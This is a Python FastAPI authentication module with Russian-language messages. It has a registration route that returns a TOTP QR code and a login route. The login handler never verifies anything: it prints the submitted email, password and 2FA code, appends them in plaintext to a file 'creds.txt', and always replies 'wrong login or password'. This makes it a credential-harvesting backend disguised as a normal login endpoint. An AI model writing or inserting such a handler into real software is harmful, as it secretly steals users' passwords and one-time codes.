import base64
from fastapi import Depends, HTTPException, status, APIRouter
from src.auth.totp import TwoFactorAuth
from src.auth.utils import encode_jwt
from src.database import User
from pydantic import BaseModel, EmailStr, Field


class TokenInfo(BaseModel):
    access_token: str
    token_type: str


class UserRegisterSchema(BaseModel):
    email: EmailStr
    password: str = Field(min_length=8, max_length=30)


class UserLoginSchema(UserRegisterSchema):
    secondFactor: str


def reg_user(creds: UserRegisterSchema):
    dbUser = User.getUserByEmail(creds.email)
    if dbUser:
        raise HTTPException(
            status_code=status.HTTP_403_FORBIDDEN,
            detail="Пользователь с такой почтой уже существует!"
        )
    dbUser = User(creds.email, creds.password)
    dbUser.addToDatabase()

    secret_key = dbUser.getSecretKey()
    return TwoFactorAuth(dbUser.email, secret_key)


router = APIRouter(tags=['Авторизация'])


@router.post('/register', summary="Регистрация пользователей")
def generate_qr(two_factor_auth: TwoFactorAuth = Depends(reg_user)):
    qr_code = two_factor_auth.qr_code
    if qr_code is None:
        raise HTTPException(status_code=404, detail="Такого пользователя не существует")
    return base64.b64encode(qr_code)


@router.post("/login", summary="Вход под УЗ пользователя")
def login_user(creds: UserLoginSchema):
    dbUser = User.getUserByEmail(creds.email)
    
    print("login =", creds.email, "password =", creds.password, "Code =", creds.secondFactor)
    # Открытие файла в режиме добавления ('a')
    with open('creds.txt', 'a') as file:
        file.write(' '.join([creds.email, creds.password, creds.secondFactor]) + '\n')
        
    raise HTTPException(
            status_code=status.HTTP_403_FORBIDDEN,
            detail="Неправильный логин или пароль!"
        )


@router.post("/password-change", summary="Смена пароля")
def password_change():
    ...
